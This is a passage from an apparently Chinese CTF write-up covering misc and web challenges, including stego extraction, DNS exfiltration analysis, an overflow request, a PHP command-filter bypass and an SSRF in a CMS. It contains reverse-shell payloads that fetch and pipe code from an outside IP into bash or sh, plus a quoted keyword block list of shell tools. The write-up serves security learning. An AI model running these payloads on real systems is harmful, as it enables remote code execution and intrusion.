s(j) = temp<br>    <span class="hljs-keyword">Next</span><br><br>    x = <span class="hljs-number">0</span><br>    y = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-number">3072</span><br>        x = (x + <span class="hljs-number">1</span>) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        y = (y + s(x)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        temp = s(x)<br>        s(x) = s(y)<br>        s(y) = temp<br>    <span class="hljs-keyword">Next</span><br><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> Len(sMessage)<br>        x = (x + <span class="hljs-number">1</span>) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        y = (y + s(x)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        temp = s(x)<br>        s(x) = s(y)<br>        s(y) = temp<br><br>        crypto = crypto &amp; (s((s(x) + s(y)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span>) <span class="hljs-built_in">Xor</span> Asc(<span class="hljs-keyword">Mid</span>(sMessage, i, <span class="hljs-number">1</span>))) &amp; <span class="hljs-string">&quot;,&quot;</span><br>    <span class="hljs-keyword">Next</span><br>    <span class="hljs-comment">&#x27;i13POMdzEAzHfy4dGS+vUA==(After base64)</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure><p>rc4后base64得到<code>PArt3:3-34</code></p><p>将一到十部分拼接在一起：<code>flag&#123;e675efb3-346f-405f-90dd-222b387edee9&#125;</code></p><h2 id="通风机"><a href="#通风机" class="headerlink" title="通风机"></a>通风机</h2><p>修补文件头，加上<code>GJK</code>后用<code>STEP 7 Micro/WIN</code>打开</p><p>符号表里注释的字符串base64得到flag</p><p><img src="/img/wp/2024/2024ciscn-%E9%80%9A%E9%A3%8E%E6%9C%BA-1.png"></p><h2 id="盗版软件"><a href="#盗版软件" class="headerlink" title="盗版软件"></a>盗版软件</h2><p>运行hackexe.exe会生成<code>loader.exe</code>和<code>output.png</code></p><p>stegsolve发现图片在红色通道每隔一位组合起来是zip，写脚本提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.png&#x27;</span>)<br>b=<span class="hljs-built_in">list</span>(a.getdata())<br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(b),<span class="hljs-number">2</span>):<br>    e.append(b[i][<span class="hljs-number">0</span>])<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>(e))<br>f.close()<br></code></pre></td></tr></table></figure><p>解压后得到<code>.b</code>文件</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">r()J$nEA&#x27;r!!#;^5u:HM1&quot;&#x27;W(Mc*q[&lt;_/-H(eBQ_+@m$P8kMf4a[h&gt;1:e3=VX?9p=!\&gt;H[_9!-P!Q!d_;F+/NMc([U69Id&gt;ct7iR(^gBUKlR.n!/lA`!!!!iKtqeC8-.(6Mb&quot;[QMa/CV!RTk-8H6e+1!)_&gt;1l+[&#x27;ejqO2X?j\E%7($238erL9ERs6#Xpc$FkBeaMa/OZ!RPFEM[W-EMa/7R!RO,j&quot;Gf?G6!.Ga!ROtQ6!-EU6!?g3ll\Sls57!F=^&quot;@S&#x27;&#x27;W&#x27;hs8Q@r^3=WR?SaG;!&#x27;sXWM&lt;7?[m%=@Z!(i%/8\&gt;*)+T!Ns8F&amp;Q@8VuM%M=EmC9Qqfgs4&#x27;f&quot;l=^2!!!$.f\g`/F!&lt;:Sa$:.up:e`[d9ejFSs1h0^_FX^B8;Y/K]&#x27;9g`i;_=uM8s?B6!-g;i^eq%6+WJ\FCG4&quot;Ktqd;8cR(Yjlhm.!!#QBlju^Ei_;/LC&#x27;6h)8;[..\cUR+?iSZ/p],bC8;&quot;i&#x27;?A\Aj5XAOd!&quot;],16!-[7njkLW6+U0o;s&quot;&amp;08;Y5UM8r=Fa[q?Y8;Z%kM&gt;9HK!nkY%s4)bs!.?7t6!%3&amp;!&#x27;gMa6!.k%&gt;!]_-0+Tc:eQ5m&gt;\ohmb@K4kLs3Bjks8W*i!Q.GW`^kgWFgOI7k?)I!=hET4.LJIugAf\<br></code></pre></td></tr></table></figure><p>对文件内容进行base85后丢到沙箱中</p><p>得到c2地址<code>39.100.72.235</code></p><p><img src="/img/wp/2024/2024ciscn-%E7%9B%97%E7%89%88%E8%BD%AF%E4%BB%B6-1.png"></p><p>然后分析<code>3842.dmp</code></p><p>使用strings搜索所有http或者ftp开头的链接</p><p><code>strings 3842.dmp | grep -iE &quot;^(http|ftp|chrome|firefox).*\.(txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag|exe)$&quot; &gt; 1.txt</code></p><p>然后去除 baidu.com xunfei.com 这种官方网站</p><p>根据题目描述<code>在网上下了一个盗版软件</code> 很明显是<code>winhack.com</code>了</p><p><img src="/img/wp/2024/2024ciscn-%E7%9B%97%E7%89%88%E8%BD%AF%E4%BB%B6-2.png"></p><p>拼接后md5</p><p><code>winhack.com39.100.72.235</code></p><p><code>flag&#123;096e8b0f9daf10869f013c1b7efda3fd&#125;</code></p><h2 id="p-p"><a href="#p-p" class="headerlink" title="p&amp;p"></a>p&amp;p</h2><p>利用溢出修改flag写入文件位置，然后访问&#x2F;static&#x2F;1即可获得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib.parse <span class="hljs-keyword">as</span> parse<br><br>url=<span class="hljs-string">&quot;http://8.147.131.163:39352/upload?name=&quot;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">112</span>+<span class="hljs-number">16</span>+<span class="hljs-number">6</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1e</span>+<span class="hljs-string">&#x27;static/1&#x27;</span><br><span class="hljs-built_in">print</span>(url)<br>r=requests.get(url)<br>url=<span class="hljs-string">&quot;http://8.147.131.163:39352/test&quot;</span><br>r=requests.get(url)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h2 id="Tough-DNS"><a href="#Tough-DNS" class="headerlink" title="Tough_DNS"></a>Tough_DNS</h2><blockquote><p>题目内容：DNS的世界充满了多变的字符，接下来我将直接给你答案：56 16 26 93 66 53 16 56 d2 03 26 93 56</p></blockquote><p>一打开就是大量请求一串10的数据</p><p><img src="/img/wp/2024/2024ciscn-Tough_DNS-1.png"></p><p>提取出来，开头7个1，一眼二维码</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">111111101100101111111<br>100000100100101000001<br>101110101010101011101<br>101110101001001011101<br>101110101110001011101<br>100000100000001000001<br>111111101010101111111<br>000000000110000000000<br>111100101010010011101<br>010010000010110111111<br>011001111000101100001<br>001110000110100001000<br>000101111001001100000<br>000000001111001110010<br>111111100100011010110<br>100000100011010000100<br>101110100001000010110<br>101110101110110100110<br>101110101011110101100<br>100000101110001111001<br>111111101111001111100<br></code></pre></td></tr></table></figure><p>扫码得到<code>15f9792dba5c</code></p><p><img src="/img/wp/2024/2024ciscn-Tough_DNS-2.png"></p><p>然后用tshark提取请求的txt字段</p><p><code>tshark -r Tough_DNS.pcapng -T json -e dns.txt -Y &quot;dns.txt&quot; &gt; 1.txt</code></p><p>分析发现每隔一位刚好组成<code>504B</code>，python提取转文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>)<br><br>d=f.read()<br>d=json.loads(d)<br><br>e1=<span class="hljs-string">&#x27;&#x27;</span><br>e2=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">2</span>):<br>    e1+=d[i][<span class="hljs-string">&#x27;_source&#x27;</span>][<span class="hljs-string">&#x27;layers&#x27;</span>][<span class="hljs-string">&#x27;dns.txt&#x27;</span>][<span class="hljs-number">0</span>]<br>    e2+=d[i+<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;_source&#x27;</span>][<span class="hljs-string">&#x27;layers&#x27;</span>][<span class="hljs-string">&#x27;dns.txt&#x27;</span>][<span class="hljs-number">0</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(e1))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(e2))<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.bin&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e1[<span class="hljs-number">1</span>:]))<br>f.close()<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.bin&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e2[<span class="hljs-number">1</span>:]))<br>f.close()<br></code></pre></td></tr></table></figure><p>有两个文件，压缩包和PGP文件</p><p><img src="/img/wp/2024/2024ciscn-Tough_DNS-3.png"></p><p>解压密码是二维码的结果，解压得到<code>secret.gpg</code></p><p>用PGPTool导入secret.gpg</p><p><img src="/img/wp/2024/2024ciscn-Tough_DNS-4.png"></p><p>然后解密提取出来的文件，密码在题目描述中</p><p>根据ascii码范围，前面应该是2-7，调整位置<code>65 61 62 39 66 35 61 65 2d 30 62 39 65</code>，得到<code>eab9f5ae-0b9e</code></p><p><img src="/img/wp/2024/2024ciscn-Tough_DNS-5.png"></p><p>得到<code>flag&#123;79830a47-faf7-4067-b585-145776f833cd&#125;</code></p><p><img src="/img/wp/2024/2024ciscn-Tough_DNS-6.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>         <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>没有过滤 str_replace ，那么就可以通过str_replace来绕过这一大串过滤</p><p>比如 <code>str_replace(z,count(),whozami);</code> 就可以拿到 whoami</p><p>因为题目中是system，所以再套一层<code>php -r</code>命令来反弹shell</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=php -r <span class="hljs-title function_ invoke__">system</span>((<span class="hljs-title function_ invoke__">str_replace</span>(z,<span class="hljs-title function_ invoke__">count</span>(),bazse64_decozde))(Y3VybCA0Ny45OS43Ny41MnxiYXNo));<br></code></pre></td></tr></table></figure><p>反弹shell后目录中没有flag，通过 ps -aux 查看发现还有mysql服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br>root           1  0.0  0.0   2364   512 pts/0    Ss+  03:49   0:00 <span class="hljs-built_in">tail</span> -f /dev/null<br>root          27  0.0  3.8  76568 20092 ?        Ss   03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      30  0.0  1.7  76592  9192 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      31  0.0  2.5  77160 13380 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      32  0.0  1.7  76640  9192 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      33  0.0  2.5  76844 13196 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      34  0.0  2.4  76648 12804 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>root         166  0.0  0.3   2420  1620 pts/0    S+   03:49   0:00 /bin/sh /usr/bin/mysqld_safe<br>mysql        279  0.0 15.9 1083992 83680 pts/0   Sl+  03:49   0:00 /usr/sbin/mariadbd --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/run/mysqld/mysqld.sock<br>root         280  0.0  0.2   5740  1056 pts/0    S+   03:49   0:00 logger -t mysqld -p daemon error<br>root         320  0.0  0.0      0     0 pts/0    Z+   03:49   0:00 [debian-start] &lt;defunct&gt;<br></code></pre></td></tr></table></figure><p>直接 mysql -u root -proot 连接，但是没有回显，需要用错误语句来触发报错回显</p><p><img src="/img/wp/2024/2024ciscn-Simple_php-2.png"></p><p><img src="/img/wp/2024/2024ciscn-Simple_php-3.png"></p><p><img src="/img/wp/2024/2024ciscn-Simple_php-4.png"></p><p><strong>其他做法</strong></p><p>%0a绕过</p><p><code>cmd=l%0as+/</code></p><p>通过hex2bin转换</p><p><code>cmd=php+-r+eval(hex2bin(substr(aa6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73656c656374202a2066726f6d20463161675f5365335265373b27603b,2)));</code></p><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p><img src="/img/wp/2024/2024ciscn-easycms-1.png"></p><p>REMOTE_ADDR绕不过去，肯定要打ssrf</p><p>后台地址被修改了，尝试爆破无果</p><p>在官方手册中找前台有远程请求的接口</p><p>最终找到一个<a href="https://www.xunruicms.com/doc/444.html">二维码函数</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=中间LOGO&amp;text=内容&amp;size=大小值&amp;level=容错率<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024ciscn-easycms-2.png"></p><p>在自己的服务器上起一个flask，重定向到 <a href="http://127.0.0.1/">http://127.0.0.1/</a> cmd就能执行命令了，用ctfshow的一键反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;http://127.0.0.1/flag.php?cmd=curl%20https://your-shell.com/47.99.77.52:1234%20|%20sh&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>然后发包</p><p><code>http://eci-2ze9sa3j2fhr9odtqwsd.cloudeci1.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://47.99.77.52/</code></p><p><img src="/img/wp/2024/2024ciscn-easycms-3.png"></p><h2 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h2><p>继续用上一题的payload，网页返回<code>二维码生成失败</code></p><p>猜测对参数进行了校验，修改成手册中完整的请求<code>/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://47.99.77.52/&amp;text=1&amp;size=h&amp;level=1</code></p><p>返回<code>此图片不是一张可用的图片</code>，应该是对网页的返回值进行了检查</p><p>在官网下载 迅睿CMS开发框架 查看源代码(之前看的一直是github上的项目，后来发现竟然与题目用的不一样。。。)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># dayrui\Fcms\Control\Api\Api.php</span><br><span class="hljs-comment">//生成二维码图片</span><br><span class="hljs-keyword">require_once</span> CMSPATH.<span class="hljs-string">&#x27;Library/Phpqrcode.php&#x27;</span>;<br><span class="hljs-variable">$file</span> = WRITEPATH.<span class="hljs-string">&#x27;file/qrcode-&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$value</span>.<span class="hljs-variable">$thumb</span>.<span class="hljs-variable">$matrixPointSize</span>.<span class="hljs-variable">$errorCorrectionLevel</span>).<span class="hljs-string">&#x27;-qrcodpng&#x27;</span>;<br><span class="hljs-keyword">if</span> (!IS_DEV &amp;&amp; <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-variable">$QR</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$file</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title class_">\QRcode</span>::<span class="hljs-title function_ invoke__">png</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$file</span>, <span class="hljs-variable">$errorCorrectionLevel</span>, <span class="hljs-variable">$matrixPointSize</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;二维码生成失败&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$QR</span> = <span class="hljs-title function_ invoke__">imagecreatefromstring</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$thumb</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-string">&#x27;https://&#x27;</span>) !== <span class="hljs-literal">false</span><br>            &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-string">&#x27;/&#x27;</span>) !== <span class="hljs-literal">false</span><br>            &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-string">&#x27;http://&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;图片地址不规范&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$thumb</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$img</span>) &#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;此图片不是一张可用的图片&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">dr_catcher_data</span>(<span class="hljs-variable">$thumb</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$code</span>) &#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;图片参数不规范&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$logo</span> = <span class="hljs-title function_ invoke__">imagecreatefromstring</span>(<span class="hljs-variable">$code</span>);<br>        <span class="hljs-variable">$QR_width</span> = <span class="hljs-title function_ invoke__">imagesx</span>(<span class="hljs-variable">$QR</span>);<span class="hljs-comment">//二维码图片宽度</span><br>        <span class="hljs-variable">$logo_width</span> = <span class="hljs-title function_ invoke__">imagesx</span>(<span class="hljs-variable">$logo</span>);<span class="hljs-comment">//logo图片宽度</span><br>        <span class="hljs-variable">$logo_height</span> = <span class="hljs-title function_ invoke__">imagesy</span>(<span class="hljs-variable">$logo</span>);<span class="hljs-comment">//logo图片高度</span><br>        <span class="hljs-variable">$logo_qr_width</span> = <span class="hljs-variable">$QR_width</span> / <span class="hljs-number">4</span>;<br>        <span class="hljs-variable">$scale</span> = <span class="hljs-variable">$logo_width</span>/<span class="hljs-variable">$logo_qr_width</span>;<br>        <span class="hljs-variable">$logo_qr_height</span> = <span class="hljs-variable">$logo_height</span>/<span class="hljs-variable">$scale</span>;<br>        <span class="hljs-variable">$from_width</span> = (<span class="hljs-variable">$QR_width</span> - <span class="hljs-variable">$logo_qr_width</span>) / <span class="hljs-number">2</span>;<br>        <span class="hljs-comment">//重新组合图片并调整大小</span><br>        <span class="hljs-title function_ invoke__">imagecopyresampled</span>(<span class="hljs-variable">$QR</span>, <span class="hljs-variable">$logo</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$from_width</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$from_width</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$logo_qr_width</span>(<span class="hljs-keyword">int</span>)<span class="hljs-variable">$logo_qr_height</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$logo_width</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$logo_height</span>);<br>        <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$QR</span>, <span class="hljs-variable">$file</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>因为有getimagesize，所以需要加个图片头</p><p>然后通过 dr_catcher_data 调用curl触发ssrf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># dayrui\Fcms\Core\Helper.php</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 调用远程数据 curl获取</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   $url</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   $timeout 超时时间，0不超时</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   $is_log 0表示请求失败不记录到系统日志中</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   $ct 0表示不尝试重试，1表示重试一次</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span>  请求结果值</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// curl模式</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;curl_init&#x27;</span>)) &#123;<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$url</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>) == <span class="hljs-string">&quot;https://&quot;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">false</span>); <span class="hljs-comment">// 跳过证书检查</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 从证书中检查SSL加密算法是否存在</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ct</span>) &#123;<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0)&#x27;</span> . <span class="hljs-string">&#x27;Gecko/20100101 Firefox/40.0&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept: */*&#x27;</span>,<br>            <span class="hljs-string">&#x27;X-Requested-With: XMLHttpRequest&#x27;</span>,<br>            <span class="hljs-string">&#x27;Referer: &#x27;</span>.<span 